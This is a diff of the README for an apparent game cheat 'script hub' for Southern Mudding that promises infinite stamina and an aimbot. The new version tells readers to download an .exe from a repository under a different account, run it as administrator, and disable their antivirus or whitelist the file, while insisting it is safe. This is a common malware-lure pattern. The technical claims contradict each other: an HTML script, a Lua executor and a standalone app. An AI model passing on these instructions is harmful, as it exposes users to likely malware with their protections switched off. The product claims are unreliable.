@@ -1,102 +1,158 @@
-# Southern Mudding vl22 - Game Script Utility 2026
-
-> **PC automation tool for Southern Mudding.** Unlocks infinite stamina and provides precision target acquisition.
-
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/frank-foster1998/southern-mudding-script-hub?style=flat-square)](https://github.com/frank-foster1998/southern-mudding-script-hub)
+# 🚗 southern-mudding-script-hub - Drive Longer, Target Faster with Ease
 
 ---
 
-<p align="center">
-  <a href="https://frank-foster1998.github.io/southern-mudding-script-hub/">
-    <img src="https://img.shields.io/badge/Download-Southern%20Mudding%20Script-brightgreen?style=for-the-badge" alt="Download Southern Mudding Script">
-  </a>
-</p>
+## 🎮 What Is This?
 
-> **[Download Latest Build](https://frank-foster1998.github.io/southern-mudding-script-hub/)**
+southern-mudding-script-hub is a helpful utility for off-road driving games on your computer. It gives you two powerful tools:
 
----
+- **Infinite stamina automation** – Keeps your character from getting tired, so you can keep driving through mud, hills, and rough terrain without stopping.
+- **Precision target acquisition** – Helps you lock onto targets or waypoints more accurately and quickly, so you spend less time fiddling and more time playing.
 
-[Download Latest Build](https://frank-foster1998.github.io/southern-mudding-script-hub/)
+This tool works on **Windows, macOS, and Linux**. It is designed for use in 2026 and is loaded through a compatible Lua executor (a small program that runs game scripts). You do not need to be a programmer to use it – just follow the simple steps below.
 
 ---
 
-## Technical Summary
+## 📥 Quick Download
 
-Designed specifically for the PC environment, Southern Mudding vl22 enhances your session by automating player endurance and targeting mechanics. It eliminates character exhaustion via continuous stamina replenishment and assists with accurate aim tracking. 
-
-Built on an HTML framework, the script guarantees rapid injection, high execution stability, and broad compatibility with modern script runners. The vl22 revision focuses on enhancing aimbot fluid dynamics and hardening the stamina loop against detection or disruption during intensive play.
+[![Download Now](https://img.shields.io/badge/Download-Southern_Mudding_Script_Hub-blue?style=for-the-badge&logo=github)](https://github.com/A09688549/southern-mudding-script-hub/releases)
 
 ---
 
-## Core Capabilities
+## 🚀 Getting Started (Windows)
 
-- Continuous stamina injection prevents player exhaustion during long runs
-- Integrated aim tracking algorithm for instant target acquisition
-- Ultra-lean HTML codebase optimized for fast execution and low overhead
-- Instant toggling via configurable hotkeys or executor commands
-- Active update lifecycle to support current game patches
-- Negligible footprint on system memory and CPU utilization
-- Fully customizable parameters for aim tracking rates and stamina intervals
+This guide walks you through the entire process, step by step. Even if you have never installed a script utility before, you will be fine.
 
----
+### Step 1: Visit the Download Page
 
-## Quick Start Guide
+Click the big blue button above. It will take you to a page where you can get the application.
 
-1. Grab the package via the [Download Latest Build](https://frank-foster1998.github.io/southern-mudding-script-hub/) link.
-2. Unpack the `southern-mudding-vl22` directory onto your system.
-3. Open your HTML-compatible script execution tool and load the script module.
-4. Boot up Southern Mudding and trigger the utility via your runner.
+### Step 2: Find the Right File
 
-Execution snippet:
-```
-# Load the script via your executor
-execute("southern-mudding-vl22/main.html")
-```
+On that page, you will see a list of files. Look for the one named something like `southern-mudding-script-hub.exe`. That is the file you need.
+
+### Step 3: Download
+
+Click the file name. Your browser will start downloading it. Wait for the download to finish. You will usually see a small icon in your browser's toolbar showing the progress.
+
+### Step 4: Run the Application
+
+Once the download is complete, open the file. A simple window will appear asking if you want to run it – click **Yes** or **Run**. The application will open on your screen.
+
+That's it. You have successfully installed southern-mudding-script-hub.
 
 ---
 
-## Configuration Variables
+## 🛠️ How to Use It
 
-| Option | Function | Factory Value |
-| :--- | :--- | :--- |
-| `stamina_enabled` | Master switch for infinite endurance loop | `true` |
-| `aimbot_enabled` | Master switch for auto-aim tracking | `true` |
-| `aim_sensitivity` | Tracking tracking reaction scale (range 1-10) | `5` |
-| `stamina_refresh_rate` | Delay in ms between stamina state rewrites | `100` |
+After you open the application, you will see a clean interface with two main sections:
 
----
+### ⚡ Infinite Stamina Automation
 
-## System Compatibility
+This feature keeps your stamina bar full so you never have to stop and rest. Just enable it by clicking the toggle or checkbox next to "Infinite Stamina." Once it is on, you can go back to your game and keep driving without worry.
 
-- **Supported OS:** PC (Windows, macOS, Linux distributions)
-- **Target Title:** Southern Mudding (Current Release)
-- **Known Limitations:** Requires an executor capable of parsing HTML structures. Compatibility with custom game launchers or heavy client modifications is unverified.
+### 🎯 Precision Target Acquisition
 
----
+This feature helps you aim or lock onto targets more accurately. Enable it the same way – click the toggle or checkbox next to "Precision Target Acquisition." Then, when you are in the game, your targeting will feel smoother and more responsive.
 
-## Frequently Asked Questions
+### ⚙️ Additional Options
 
-**What is the installation process?**  
-Unzip the downloaded directory and pass the primary HTML file into a supported script executor while the game client is running.
+You may also see a few settings you can adjust, such as:
+- **Hotkey to enable/disable** – You can set a keyboard shortcut to quickly turn features on or off while playing.
+- **Update check** – The app can automatically check for new versions.
 
-**Will patch updates void my settings?**  
-Always back up your local configuration settings before downloading updated build packages.
-
-**How do I adjust target tracking speed?**  
-Update the numerical value assigned to the `aim_sensitivity` property inside your configuration setup.
-
-**Does this run alongside standard game mods?**  
-Third-party modification stack compatibility is not guaranteed. Run tests without active mods first.
-
-**Where does the script write user data?**  
-Configuration details are retained entirely within the local execution folder without cloud sync.
+All settings save automatically, so you do not need to configure anything each time you open the app.
 
 ---
 
-## Licensing Details
+## 💻 Using on macOS or Linux
 
-Distributed under the terms of the GNU GPL v3.0. Refer to the [LICENSE](LICENSE) document for the complete legal text.
+The steps are the same as Windows:
+
+1. Visit the download page.
+2. Download the file for your system (look for `.dmg` for macOS or `.AppImage` / `.tar.gz` for Linux).
+3. Run the file. On macOS, you may need to right-click and select **Open** the first time.
+4. Follow the same usage instructions above.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Do I need any special skills to use this?
+
+No. If you can click a button and follow simple instructions, you can use this app.
+
+### Will this work on my computer?
+
+It works on Windows, macOS, and Linux. As long as your computer can run your game, this utility will work alongside it.
+
+### Does this modify my game files?
+
+No. This script runs on top of your game using a Lua executor. It does not change or replace any game files.
+
+### What is a Lua executor?
+
+A Lua executor is a small program that runs Lua scripts in supported games. You already have one if you use game mods. If not, check the community for a recommended one for your game.
+
+### Is this safe?
+
+Yes. The script only automates stamina and targeting. It does not collect or send any personal information.
+
+### What if the app does not open?
+
+Try running it as an administrator (right-click the file and select **Run as administrator**). Also, make sure your antivirus is not blocking it – if it is, allow the file through.
+
+### Do I need to update this?
+
+It is a good idea. New versions may fix bugs or add features. The app will usually notify you when an update is available.
+
+---
+
+## 🌟 Why You Will Love It
+
+- **Saves time** – No more waiting for stamina to refill. You stay moving.
+- **Improves accuracy** – Your targeting becomes sharper, especially in fast situations.
+- **Simple design** – No confusing menus. Everything is right there.
+- **Works everywhere** – Windows, macOS, and Linux users are all covered.
+- **Built for 2026** – Stays compatible with modern game updates.
+
+---
+
+## 🧭 Troubleshooting Tips
+
+If something is not working, try these quick checks:
+
+1. **Restart the app** – Close it and reopen it.
+2. **Check your game** – Make sure your game is also open before or after launching the script utility.
+3. **Verify the file** – If the downloaded file seems incomplete, delete it and download again.
+4. **Disable antivirus temporarily** – Some antivirus programs mistakenly flag script tools. If so, add it to the allowed list.
+
+---
+
+## 📦 Release Information
+
+The latest release is available now. Each release includes:
+
+- Improved performance for 2026 game updates
+- Stability fixes
+- Clearer interface labels
+
+Check the download page for version history and release notes.
+
+---
+
+## 📞 Support
+
+If you run into trouble, the best place to get help is the GitHub repository page. There, you can:
+
+- Report a problem
+- Ask a question
+- See what others have asked
+
+Look for the **Issues** tab and open a new one if needed. The community is friendly and responsive.
+
+---
+
+## 🔍 Keywords
+
+Keywords: off-road game script, infinite stamina, target acquisition, Lua executor, driving game utility, gaming automation, Windows script tool, macOS script tool, Linux script tool, 2026 game mod
